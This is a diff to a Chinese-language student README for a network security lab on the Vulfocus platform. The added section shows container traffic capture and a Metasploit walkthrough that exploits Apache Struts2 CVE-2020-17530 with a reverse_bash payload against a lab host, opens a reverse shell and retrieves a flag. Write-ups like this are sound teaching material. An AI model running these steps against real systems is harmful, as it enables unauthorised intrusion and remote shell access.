@@ -7,8 +7,6 @@
     </h4>
 </h1>
 </div>
-
-
 ## 📜仓库说明
 
 本仓库基于[基础团队实践训练](https://c4pr1c3.github.io/cuc-wiki/cp/2023/index.html#_12)跟练复现完成的 [网络安全(2021) 综合实验](https://www.bilibili.com/video/BV1p3411x7da/) 。其中以红蓝队角色完成相应的网络攻防场景在线，其中主要是基于Vulfocus平台提供的靶场环境进行实验
@@ -385,13 +383,159 @@ flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
 
 > 以【**跨网段渗透**(常见的`dmz`)】为例
 
+#### 捕获指定容器的上下行流量
+
+为后续的攻击过程「分析取证」保存流量数据
+
+  ```bash
+$ docker ps # 先查看目标容器名称或ID
+$ container_name="<替换为目标容器名称或ID>"
+$ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
+  ```
+
+  <img src="img/tcpdump.png" alt="tcpdump" style="zoom:50%;" />
+
+建议放到 `tmux` 会话中，然后放到后台运行
+
+<img src="img/tmux.png" alt="tmux" style="zoom:50%;" />
+
+#### 外层网络渗透
+
+##### 🚩攻破靶标-1
+
+从模拟显示的角度来考虑，最外层的主机负责对外提供服务，于是直接得到了提供服务的端口号，也就是vulfocus平台上场景的入口端口
+
+因此通过Metasploit工具的平台搜索struts2或者~~不演了~~直接搜索CVE-2020-17530，如果是前者的话需要进行一点肉眼筛选，这次的漏洞编号说明是2020年的漏洞，于是可用的exploit只有2020年9月14日的：
+
+```shell
+msf6 > search struts2
+Matching Modules
+================
+   #  Name                                             Disclosure Date  Rank       Check  Description
+   -  ----                                             ---------------  ----       -----  -----------
+   0  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
+   1  exploit/multi/http/struts2_multi_eval_ognl       2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
+   2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
+   4  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
+   5  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   6  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
+   7  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
+
+Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/http/struts_code_exec_parameters
+msf6 > search cve-2020-17530
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/struts2_multi_eval_ognl
+msf6 >
+```
+
+- 切换到攻击者主机 attacker 进行 metasploit 基础配置
+
+  > Metasploit 是一款用于渗透测试和漏洞利用的开源工具，旨在帮助安全专家评估和增强计算机系统、网络和应用程序的安全性。它是一个广泛使用的渗透测试框架，包含一个控制台界面，称为 Metasploit Console 或 msfconsole，以及一组命令行工具，用于执行各种渗透测试任务。Metasploit 还提供了一个巨大的漏洞数据库和利用代码库，使用户能够更容易地利用已知的漏洞。
+  > Metasploit 可以帮助安全团队或个人测试计算机系统中的漏洞，并利用这些漏洞，以检查系统的安全性和脆弱性。该工具具有丰富的功能和模块，使渗透测试人员能够执行各种攻击，包括远程执行代码、获取系统权限、发现敏感数据等。
+
+  ```bash
+  # metasploit 基础配置
+  # 更新 metasploit
+  $ sudo apt install -y metasploit-framework
+  # 初始化 metasploit 本地工作数据库
+  $ sudo msfdb init
+  # 启动 msfconsole
+  $ msfconsole
+  ```
+
+  <img src="../程若楠/img/msfconsole.png" alt="msfconsole" style="zoom:50%;" />  
+
+  ```bash
+  # 确认已连接 pgsql
+  $ db_status
+  # 建立工作区
+  $ workspace -a Cynthia
+  ```
+
+  <img src="../程若楠/img/db_workspace.png" alt="db_workspace" style="zoom:50%;" /> 
+
+- 首先要收集服务识别与版本等信息，不断搜索并且完善关键词，最后找到我们所需的 **exp**：`exploit/multi/http/struts2_multi_eval_ognl`
+
+  ```bash
+  # search exp in metasploit
+  $ search struts2 type:exploit
+  # 查看 exp 详情
+  # 可以直接通过搜索结果编号，也可以通过搜索结果的 Name 字段
+  $ info <结果编号或 Name 字段>
+  # 继续完善搜索关键词
+  $ search S2-059 type:exploit
+  ```
+
+  <img src="../程若楠/img/search_exp.png" alt="search_exp" style="zoom:50%;" /> 
 
 
+- 找到我们所需的 exp 后就选择使用，并且选择设置合适的 exp payload
+
+  ```bash
+  # 使用符合条件的 exp
+  $ use exploit/multi/http/struts2_multi_eval_ognl
+  
+  # 查看可用 exp payloads
+  $ show payloads
+  
+  # 使用合适的 exp payload
+  $ set payload payload/cmd/unix/reverse_bash
+  ```
+
+  <img src="../程若楠/img/use_n_set_exp.png" alt="use_n_set_exp" style="zoom:50%;" /> 
+
+- 查看并且配置 exp 参数，确保所有 `Required=yes` 参数均正确配置
+
+  ```bash
+  # 查看 exp 可配置参数列表
+  $ show options
+  # 靶机 IP
+  $ set RHOSTS 192.168.98.131 
+  # 靶机目标端口
+  $ set rport  53746          
+  # 攻击者主机 IP
+  $ set LHOST  192.168.98.130 
+  
+  # 再次检查 exp 配置参数列表
+  $ show options
+  ```
+
+  <img src="../程若楠/img/show_options.png" alt="show_options" style="zoom:50%;" />
 
 
+  <img src="../程若楠/img/set_exp.png" alt="set_exp" style="zoom:50%;" />
+
+- 接下进行 getshell，如果攻击成功，查看打开的 reverse shell，进入会话后，发现无命令行交互提示信息，此时我们试一试 Bash 指令，可以发现我们已经打下了第一个靶标，查看其 `/tmp` 目录，成功得到 `flag1`。
+
+  ```bash
+  # getshell
+  $ exlpoit -j
+  
+  # 如果攻击成功，查看打开的 reverse shell
+  $ sessions -l
+  
+  # 进入会话 1
+  $ sessions -i 1
+  
+  # 无命令行交互提示信息，试一试 Bash 指令
+  $ id
+  # get flag-1
+  $ ls /tmp
+  # flag-{bmh22c0ab9a-dbef-44b3-a55d-3c448528ae0d}
+  
+  # 通过 CTRL-Z 将当前会话放到后台继续执行
+  ```
 
 
-
+  <img src="img/flag1.png" alt="flag1" style="zoom:50%;" />
 
 
 
